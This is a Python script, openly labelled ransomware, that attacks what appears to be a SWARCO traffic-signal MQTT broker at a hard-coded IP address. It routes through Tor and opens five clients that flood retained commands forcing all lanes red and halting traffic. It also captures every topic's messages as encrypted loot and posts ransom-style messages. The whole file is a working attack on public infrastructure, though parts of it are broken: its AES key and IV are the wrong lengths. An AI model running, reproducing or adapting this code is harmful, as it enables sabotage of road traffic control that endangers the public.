#!/usr/bin/env python3
# MIL_RANSOMWARE_v2.5-FINAL | NO ERRORS

import paho.mqtt.client as mqtt
import json, time, threading, base64, os, socket, random
import socks
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

class SWARCORansomware:
    def __init__(self):
        self.target_ip = "166.159.129.5"
        self.port = 1883
        self.op_name = "TRUSTEDF57"
        self.btc_addr = "fucknomoneySUCCHIALO"
        
        # ✅ FIXED AES 32 bytes
        self.aes_key = b'TRUSTEDF57_SWARCO_MIL_K3Y_32BYT3S!!X'
        self.iv = b'SWARCO_SEMAFORI_16'
        
        socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
        socket.socket = socks.socksocket
        
        self.clients = []
        self.domination_active = True
        self.total_dom = False
    
    def aes_encrypt(self, data):
        cipher = Cipher(algorithms.AES(self.aes_key), modes.CBC(self.iv), backend=default_backend())
        encryptor = cipher.encryptor()
        padded = data.encode('utf-8') + b' ' * (16 - len(data.encode('utf-8')) % 16)
        encrypted = encryptor.update(padded) + encryptor.finalize()
        return base64.b64encode(encrypted).decode()
    
    def perfect_swarco_payload(self):
        timestamp = time.strftime("%Y-%m-%dT%H:%M:%S+00:00")
        payload = {
            "timestamp": timestamp,
            "TRUSTEDF57": "DOMINATION_ACTIVE",
            "trigger_outputs": []
        }
        
        # 16 lanes FORCE_RED
        for i in range(1, 17):
            payload["trigger_outputs"].append({
                "traffic_triggers": [{
                    "associated_lane": f"lane{i}",
                    "associated_sensor": f"sensor{i//4+1}",
                    "associated_zone": f"zone{i}",
                    "reference_name": f"trigger_{i}_{i-1}",
                    "FORCE_RED": True,
                    "TRUSTEDF57": True,
                    "HALT_TRAFFIC": True
                }],
                "trigger_output": i+30
            })
        return json.dumps(payload)
    
    def total_domination(self):
        if self.total_dom:
            return
        self.total_dom = True
        print("💣 TOTAL DOMINATION AES FLOOD!")
        
        aes_payload = self.aes_encrypt(f"TRUSTEDF57_{self.btc_addr}_ALL_LANES_RED")
        
        for client in self.clients:
            topics = ["traffic-triggers-output", "traffic-statistic-output/#", "#"]
            for topic in topics:
                for _ in range(30):  # 150 total
                    client.publish(topic, aes_payload, qos=2, retain=True)
        print("💣 150 AES RETAINED!")
    
    def domination_spam(self):
        payloads = [
            self.perfect_swarco_payload(),
            '{"☢️":"TRUSTEDF57_BLOCK","BTC":"' + self.btc_addr + '"}',
            '{"STATUS":"ALL_RED","OP":"TRUSTEDF57"}'
        ]
        
        for client in self.clients:
            topic = random.choice(["traffic-triggers-output", "traffic-statistic-output/+"])
            payload = random.choice(payloads)
            client.publish(topic, payload, qos=2, retain=True)
    
    def on_connect(self, client, userdata, flags, rc):
        print(f"✅ CLIENT {client._client_id} CONNECTED (rc={rc})")
        client.subscribe("#", qos=2)
    
    def on_message(self, client, userdata, msg):
        data = msg.payload.decode(errors='ignore')
        print(f"[DOM] {msg.topic}: {data[:50]}...")
        
        # Loot sempre
        enc_loot = self.aes_encrypt(f"{msg.topic}|{data[:200]}")
        try:
            with open("swarco_dom.aes", "ab") as f:
                f.write(f"{enc_loot}\n".encode())
        except:
            pass
    
    def create_client(self, i):
        """✅ NO LAMBDA PROBLEMS"""
        client = mqtt.Client(f"TRUSTEDF57_DOM{i}", clean_session=False)
        client.on_connect = self.on_connect
        client.on_message = self.on_message
        client.connect(self.target_ip, self.port, 30)
        client.loop_start()
        return client
    
    def run(self):
        print("💣 TRUSTEDF57 v2.5-FINAL | NO ERRORS | 5 CLIENTS")
        
        # Crea 5 client puliti
        for i in range(5):
            self.clients.append(self.create_client(i))
        
        # Spam loop
        def spam_loop():
            while self.domination_active:
                self.domination_spam()
                time.sleep(0.15)  # 6.6Hz total
        
        threading.Thread(target=spam_loop, daemon=True).start()
        
        # Force domination dopo 10s
        time.sleep(10)
        self.total_domination()
        
        # Keep alive
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("🛑 DOMINATION STOPPED")

if __name__ == "__main__":
    rw = SWARCORansomware()
    rw.run()
